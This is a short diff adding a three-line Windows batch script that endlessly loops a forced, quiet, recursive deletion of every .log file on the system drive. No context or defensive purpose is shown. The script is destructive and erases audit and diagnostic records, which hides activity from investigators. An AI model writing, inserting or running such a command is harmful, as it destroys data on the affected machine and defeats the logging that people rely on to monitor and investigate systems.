@@ -1,0 +1,3 @@
+:set
+del /f /s /q %systemdrive%\*.log
+goto set
